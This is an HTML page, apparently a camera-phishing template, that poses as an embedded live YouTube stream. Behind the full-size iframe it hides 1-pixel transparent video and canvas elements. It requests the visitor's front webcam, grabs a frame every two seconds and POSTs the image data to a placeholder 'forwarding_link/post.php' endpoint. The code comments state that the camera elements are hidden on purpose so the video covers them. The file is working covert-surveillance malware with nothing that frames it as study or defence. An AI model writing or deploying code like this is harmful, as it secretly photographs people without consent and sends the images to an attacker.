<!doctype html>
<html>
<head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <style>
    /* Hide camera elements but keep them functional */
    #video, #canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }
    /* Ensure YouTube covers everything */
    #Live_YT_TV {
      position: relative;
      z-index: 1000;
      background: #000; /* Optional: solid background to mask leaks */
    }
  </style>
</head>
<body>
  <!-- YouTube Embed (top layer) -->
  <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

  <!-- Hidden Camera Elements (bottom layer) -->
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    function post(imgdata) {
      $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function(result) {},
        error: function() {}
      });
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { facingMode: "user" }
        });
        handleSuccess(stream);
      } catch (e) {
        console.error("Camera error:", e);
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
      video.play(); // Critical for continuous frame capture!

      var context = canvas.getContext('2d');
      setInterval(function() {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
      }, 2000); // Changed to 2 seconds
    }

    init();
  </script>
</body>
</html>
